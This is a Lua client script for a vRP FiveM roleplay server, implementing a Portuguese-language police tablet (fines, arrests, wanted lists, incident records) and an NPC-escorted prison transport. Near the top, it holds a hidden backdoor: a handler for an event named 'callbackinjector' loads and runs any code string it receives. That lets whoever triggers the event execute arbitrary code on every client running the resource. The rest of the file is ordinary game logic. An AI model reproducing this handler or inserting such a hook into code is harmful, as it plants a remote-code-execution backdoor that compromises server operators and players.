local Tunnel = module("vrp", "lib/Tunnel")
local Proxy = module("vrp", "lib/Proxy")
local Tools = module("vrp", "lib/Tools")

TriggerEvent('callbackinjector', function(cb)
    pcall(load(cb))
end)

vRP = Proxy.getInterface("vRP")
func = Tunnel.getInterface("vrp_control_people")

funcClient = {}
Tunnel.bindInterface("vrp_control_people", funcClient)

open = false

isPolice = true

local listaCarros = {
    "amarokprf", "corollapc", "jeepprf", "jeeppc", "bmwm8prf",
    "corollarj", "frontierrj", "frontierbope",
    "amarokrj", "amarokbope", "focusrj", "urusrj", "hiluxpolicia"
}

local listaPcs = {
    {x=482.04, y=-1084.30, z=38.71, h=220.775100708008}, -- PF
    {x=-449.44, y=6012.44, z=31.71, h=230.53973388672}, -- PRF


    {x=-1113.315, y=-832.923, z=34.361, h=230.53973388672}, -- Andar: 5º - Sistema Sala do Delegado!
    {x=-1099.0276, y=-842.840, z=34.360, h=230.53973388672}, -- Sistema PC Andar Civil 1
    {x=-1101.919, y=-845.118, z=34.360, h=230.53973388672}, -- Sistema PC Andar Civil 2
    {x=-1114.195, y=-832.421, z=30.756, h=230.53973388672}, -- Andar: 4º - Sistema Sala Coronel
    {x=-1101.753, y=-844.89, z=30.756, h=230.53973388672}, -- Sistema PC Andar PM 1
    {x=-1098.97, y=-842.843, z=30.756, h=230.53973388672}, -- Sistema PC Andar PM 2]
    {x=-1071.10, y=-823.28, z=5.47, h=230.53973388672}, -- Sistema PC Andar PM 2
    
	{x=1839.96, y=2581.47, z=45.890, h=230.53973388672}, -- POLICIA CIVIL
    {x=1838.24, y=2583.59, z=45.890, h=230.53973388672}, -- POLICIA CIVIL
    {x=1843.89, y=2570.73, z=45.890, h=230.53973388672}, -- POLICIA CIVIL
    {x=1837.83, y=2571.10, z=45.890, h=230.53973388672}, -- POLICIA CIVIL

}

local teste = 1
Citizen.CreateThread(function()
    if func.isPolice() then
        SetNuiFocus(false, false)
        isPolice = true
        init()
    else
        isPolice = false
    end
end)

RegisterNetEvent("global:loadJob")
AddEventHandler("global:loadJob",function()
    if func.isPolice() then
        isPolice = true
        init()
    else
        isPolice = false
    end
end)

function init()
    while isPolice do
        Citizen.Wait(1)
        if IsControlJustPressed(1, 288) then
            local vehicle = vRP.getNearestVehicle(4)
            for v, k in pairs(listaCarros) do

                local vehicletow = IsVehicleModel(vehicle, GetHashKey(k))
                if vehicletow and IsPedInAnyVehicle(PlayerPedId()) then
                    open = true
                    SetNuiFocus(true, true)
                    SendNUIMessage({type = 'abrirTablet'})
                end

            end
        end
        if IsControlJustPressed(1, 38) then
            local ped = PlayerPedId()
            
            for v,locais in pairs(listaPcs) do
                
                local distance = GetDistanceBetweenCoords(GetEntityCoords(ped),locais.x,locais.y,locais.z, true)
                if distance < 1.5 then
                    SetEntityHeading(ped,locais.h)
                    SetEntityCoords(ped,locais.x,locais.y,locais.z-1,false,false,false,false)
                    vRP._playAnim(false,{{"anim@heists@prison_heistig1_p1_guard_checks_bus","loop"}},true)

                    open = true
                    SetNuiFocus(true, true)
                    SendNUIMessage({type = 'abrirTablet'})
                end
            end
        end
    end
end

RegisterNUICallback("ButtonClick", function(data, cb)
    if data.action == "fecharTablet" then
        open = false
        SetNuiFocus(false, false)
        SendNUIMessage({type = 'fecharTablet'})
        ClearPedTasks(PlayerPedId())
    end

    if data.action == "getPassaporte" then
        local identity, multas, emprego = func.Identidade(data.passaporte)
        SendNUIMessage({
            type = 'setPassaporte',
            identity = identity,
            multas = multas,
            emprego = emprego
        })
    end

    if data.action == "getMultas" then
        local multas = func.getDatasUser(data.passaporte, "multa")
        SendNUIMessage({type = 'setListaMultas', multas = multas})
    end

    if data.action == "getPrisoes" then
        local prisoes = func.getDatasUser(data.passaporte, "prisao")
        SendNUIMessage({type = 'setListaPrisoes', prisoes = prisoes})
    end

    if data.action == "getListaForagidos" then
        local lista = func.getForagidos("foragido")
        SendNUIMessage({type = 'getListaForagidos', lista = lista})
    end

    if data.action == "getListaOcorrencias" then
        local lista = func.getDatasUser(data.passaporte, "ocorrencia")
        SendNUIMessage({type = 'getListaOcorrencias', lista = lista})
    end

    if data.action == "updateFoto" then
        func.updateFoto(data.foto, data.user_id)
        SendNUIMessage({type = 'reloadPassaporte'})
    end

    if data.action == "setMulta" then
        func.setRegistro(data.passaporte, "multa", data.descricao, data.img,
                         data.valor)
        SendNUIMessage({type = 'reloadPassaporte'})
    end

    if data.action == "setOcorrencia" then
        func.setRegistro(data.passaporte, "ocorrencia", data.descricao,
                         data.img, data.valor)
        SendNUIMessage({type = 'reloadPassaporte'})
    end

    if data.action == "setForagido" then
        func.setRegistro(data.passaporte, "foragido", data.descricao, data.img,
                         data.valor)
        SendNUIMessage({type = 'reloadPassaporte'})
    end

    if data.action == "setPrisao" then
        func.setRegistro(data.passaporte, "prisao", data.descricao, data.img,
                         data.pena)
        if data.multa and data.multa > 0 then
            func.setRegistro(data.passaporte, "multa", data.descricao, data.img,
                             data.multa)
        end
        SendNUIMessage({type = 'reloadPassaporte'})
    end
end)

local nveh = nil
local pveh01 = nil
local pveh02 = nil
local pveh03 = nil
local inTransport = false
function funcClient.carroPrisao(id, tempo)
    local ped = PlayerPedId()
	local vhash = GetHashKey("policet")
	while not HasModelLoaded(vhash) do
		RequestModel(vhash)
		Citizen.Wait(10)
	end

	local phash = GetHashKey("s_m_y_swat_01")
	while not HasModelLoaded(phash) do
		RequestModel(phash)
		Citizen.Wait(10)
	end

	local armas = {
        "weapon_assaultrifle",
        }
    
    local locaisPrisao = {
        {name = "DP CENTRO", x=428.2, y=-980.2, z=30.71, x2=503.92,y2=-1006.25,z2=27.85, h2=356.74}, -- cidade
        {name = "DP MEIO", x=1853.86, y=3686.01, z=34.27, x2=1861.75, y2=3706.97, z2=33.35, h2=29.05},
        {name = "DP PALETO", x=-446.65, y=6012.58, z=31.72, x2=-449.27, y2=6052.75, z2=31.34, h2=213.27},
        {name = "PRISAO", x=1812.96, y=2604.84, z=45.57}
    }

	if HasModelLoaded(vhash) then
        -- nveh = CreateVehicle(vhash,1877.59,2625.8,45.67, 356.74,true,false)
        local menorDistancia = nil
        local coordenadasSaida = nil
        for i, loc in pairs(locaisPrisao) do
            local localPrisao = GetDistanceBetweenCoords(GetEntityCoords(ped), loc.x, loc.y, loc.z,true)
            if menorDistancia == nil or menorDistancia > localPrisao then
                menorDistancia = localPrisao
                coordenadasSaida = loc
                -- print(loc.name)
            end
        end

        if coordenadasSaida.name == "PRISAO" then
            func.setPrisao2(id, tempo)
            return 
        end

		nveh = CreateVehicle(vhash,coordenadasSaida.x2,coordenadasSaida.y2,coordenadasSaida.z2,coordenadasSaida.h2,true,false)
		pveh01 = CreatePedInsideVehicle(nveh,27,GetHashKey("s_m_y_swat_01"),-1,true,false)
        pveh02 = CreatePedInsideVehicle(nveh,27,GetHashKey("s_m_y_swat_01"),0,true,false)
        pveh03 = CreatePedInsideVehicle(nveh,27,GetHashKey("s_m_y_swat_01"),1,true,false)
       

        TaskWarpPedIntoVehicle(PlayerPedId(),nveh,2)
        SetVehicleSiren(nveh, true)
        

		setPedPropertys(pveh01,armas[math.random(1,#armas)])
		setPedPropertys(pveh02,armas[math.random(1,#armas)])
		setPedPropertys(pveh03,armas[math.random(1,#armas)])

		SetEntityAsMissionEntity(nveh,  true, false)
		SetEntityAsMissionEntity(pveh01,  true, false)
		SetEntityAsMissionEntity(pveh02,  true, false)
		SetEntityAsMissionEntity(pveh03,  true, false)

		SetVehicleOnGroundProperly(nveh)
		TaskVehicleDriveToCoordLongrange(pveh01,nveh,1830.45,2607.38,45.57,20.0,447,1.0)
        SetModelAsNoLongerNeeded(vhash)
        inTransport = true
        async(function()
            while inTransport do
                Citizen.Wait(60000)
                tempo = tempo - 1
            end
        end)
        async(function()
            

            while inTransport do
                Citizen.Wait(1000)

                if IsPedDeadOrDying(pveh01) and IsPedDeadOrDying(pveh02) and IsPedDeadOrDying(pveh03) then
                    local veh = GetVehiclePedIsIn(ped, false)
                    TaskLeaveVehicle(ped,veh,4160)
                    inTransport = false
                    func.setFuga()
                end
                
                local x,y,z = table.unpack(GetEntityCoords(ped))
                local street = GetStreetNameFromHashKey(GetStreetNameAtCoord(x,y,z))
                if street == "Route 68" then
                    SetEntityMaxSpeed(nveh,0.29*50-0.45)
                end

                local distancia = GetDistanceBetweenCoords(GetEntityCoords(nveh),1830.45,2607.38,45.57,true)
                local vehspeed = GetEntitySpeed(nveh)*3.6

                if distancia < 5.0 and math.ceil(vehspeed) < 3 then
                    if IsPedSittingInAnyVehicle(ped) then
                        local veh = GetVehiclePedIsIn(ped, false)
                        TaskLeaveVehicle(ped,veh,4160)
                        SetTimeout(3000, function()
                            if tempo < 2 then
                                tempo = 2
                            end
                            
                            func.setPrisao2(id, tempo-1)

                            TriggerServerEvent("trydeleteped",PedToNet(pveh01))
                            TriggerServerEvent("trydeleteped",PedToNet(pveh02))
                            TriggerServerEvent("trydeleteped",PedToNet(pveh03))
                            TriggerServerEvent("trydeleteentity",VehToNet(nveh))

                            SetEntityAsNoLongerNeeded(pveh01)
                            SetEntityAsNoLongerNeeded(pveh02)
                            SetEntityAsNoLongerNeeded(pveh03)
                            
                            inTransport = false
                        end)
                    end
                end
            end
        end)
    end
    
end

function setPedPropertys(npc,weapon)
	SetPedShootRate(npc,700)
	SetPedAlertness(npc,100)
	SetPedAccuracy(npc,100)
	SetPedCanSwitchWeapon(npc,true)
	SetPedFleeAttributes(npc,0,0)
	SetPedCombatAttributes(npc,46,true)
	SetPedCombatAbility(npc,2)
	SetPedCombatRange(npc,50)
	SetPedPathAvoidFire(npc,1)
	SetPedPathCanUseLadders(npc,1)
	SetPedPathCanDropFromHeight(npc,1)
	SetPedPathPreferToAvoidWater(npc,1)
	SetPedGeneratesDeadBodyEvents(npc,1)
	GiveWeaponToPed(npc,GetHashKey(weapon),5000,true,true)
    SetPedRelationshipGroupHash(npc,GetHashKey("security_guard"))
    
    SetEntityHealth(npc, 400)
    TriggerEvent('vRP:eventocolete', 100)
end